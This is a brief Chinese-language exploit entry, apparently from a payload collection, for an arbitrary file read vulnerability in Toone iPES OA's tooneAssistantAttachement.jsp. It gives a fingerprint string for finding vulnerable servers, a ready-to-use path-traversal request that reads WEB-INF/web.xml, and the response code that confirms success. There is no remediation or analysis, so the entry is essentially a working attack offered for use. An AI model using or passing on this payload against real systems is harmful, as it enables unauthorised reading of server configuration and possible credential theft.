# 同望OAtooneAssistantAttachement.jsp任意文件读取漏洞

同望iPES ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="loginAction.struts?actionType=blockLogin"`

**Payload**
```
/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml HTTP/1.1
```
- **响应特征**：200